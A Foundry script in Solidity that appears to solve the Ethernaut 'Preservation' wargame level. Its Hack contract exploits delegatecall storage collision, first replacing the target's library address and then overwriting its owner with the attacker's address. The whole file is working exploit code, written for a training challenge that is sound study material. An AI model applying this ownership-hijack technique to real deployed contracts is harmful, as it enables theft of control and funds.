// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract PreservationSolution is Script {
    address Instance = 0x51a09fdCB81cA33363BA943012336F4c257087E9;

    function run() external {
        vm.startBroadcast();
        Hack hack = new Hack();
        hack.attack(IPreservation(Instance), vm.envAddress("MY_ADDRESS"));
        IPreservation(Instance).owner();
        vm.stopBroadcast();
    }
}

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
}

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function attack(IPreservation target, address me) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(address(me))));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
